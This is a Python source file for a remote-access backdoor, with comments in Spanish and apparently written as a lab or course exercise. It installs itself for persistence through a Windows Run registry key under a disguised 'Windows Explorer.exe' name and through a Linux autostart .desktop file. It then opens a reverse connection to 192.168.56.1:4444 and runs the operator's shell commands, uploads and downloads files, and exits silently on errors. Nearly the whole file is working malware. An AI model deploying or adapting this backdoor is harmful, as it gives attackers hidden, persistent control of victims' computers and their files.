#!/usr/bin/env python
import socket
import subprocess
import json
import os
import base64
import sys
import shutil
import shutil
import subprocess


class Backdoor:
    def __init__(self, ip, port):
        #self.become_persistent()
        self.become_persistent_linux()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def become_persistent(self):
        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True)



    def become_persistent_linux(self):
            # Ruta para colocar el archivo malicioso
            evil_file_location = os.path.expanduser("~/.local/bin/evil_program")  # Directorio local del usuario
            autostart_file = os.path.expanduser("~/.config/autostart/evil_program.desktop")  # Archivo de inicio automático

            # Crear la carpeta si no existe
            os.makedirs(os.path.dirname(evil_file_location), exist_ok=True)
            os.makedirs(os.path.dirname(autostart_file), exist_ok=True)

            # Copiar el script actual al nuevo lugar si no existe
            if not os.path.exists(evil_file_location):
                shutil.copyfile(sys.executable, evil_file_location)  # Copia el ejecutable actual
                os.chmod(evil_file_location, 0o755)  # Dar permisos de ejecución

            # Crear un archivo .desktop para que se ejecute al iniciar sesión
            autostart_content = f"""
        [Desktop Entry]
        Type=Application
        Exec={evil_file_location}
        Hidden=false
        NoDisplay=false
        X-GNOME-Autostart-enabled=true
        Name=Evil Program
        Comment=Persistence Backdoor
        """
            # Guardar el archivo de autostart
            with open(autostart_file, "w") as file:
                file.write(autostart_content)


    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        DEVNULL = open(os.devnull, 'wb')
        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)

    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Cambiando de directorio " + path

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Descarga completa."

    def run(self):
        while True:
            command = self.reliable_receive()

            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == "descargar":
                    command_result = self.read_file(command[1])
                elif command[0] == "subir":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command)
            except Exception:
                command_result = "[-] Error during command execution."
            
            self.reliable_send(command_result)



try:
    my_backdoor = Backdoor("192.168.56.1", 4444)
    my_backdoor.run()
except Exception:
    sys.exit()